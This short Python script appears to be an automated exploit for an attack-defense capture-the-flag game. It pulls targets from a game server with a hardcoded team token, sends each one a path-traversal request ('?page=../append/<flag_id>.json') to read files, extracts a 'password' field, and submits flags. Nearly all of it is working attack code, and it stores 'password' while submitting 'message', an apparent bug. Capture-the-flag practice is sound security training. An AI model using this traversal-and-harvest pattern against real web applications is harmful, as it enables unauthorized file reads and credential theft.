import json
import requests
from swpag_client import Team

team = Team('http://34.211.129.130', 'WOfdkzdhsZEIlPEIai49')

targets = team.get_targets(2)
flags = []
for target in targets:
    print(target)
    url = f'http://{target["hostname"]}:{target["port"]}/?page=../append/{target["flag_id"]}.json'
    print(f'request url: {url}')
    resp = requests.get(url)
    print(f'response: {resp.text}')
    if "password" in resp.text:
        try:
            content = json.loads(resp.text)
            print(f'content: {content}')
            flags.append(content['password'])
            team.submit_flag([content['message']])
        except Exception as e:
            print('some error occurred')
